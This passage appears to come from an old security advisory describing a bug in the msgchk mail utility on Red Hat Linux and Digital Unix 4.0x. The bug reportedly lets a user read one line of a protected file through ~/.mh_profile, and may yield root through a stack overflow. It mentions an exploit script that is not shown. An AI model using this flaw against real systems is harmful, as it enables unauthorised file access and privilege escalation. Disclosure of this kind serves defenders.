 
 Next , /usr/bin/mh/msgchk has a vulnerability that anyone read  1 line  
 of the unprivileged file on the system
 it's a old bug on redhat linux 2.0, but it also works on digital unix
4.0x
 
 exploit script is also followed end of this document too.
 
 
i didn't test it on other version of digital unix or tru64 unix , but 4.0d
if stack is excutable, then overflow bug have you get root privilege ,
bug of ~/.mh_profile file control would make you read 1 line of
unprivileged file on the system.
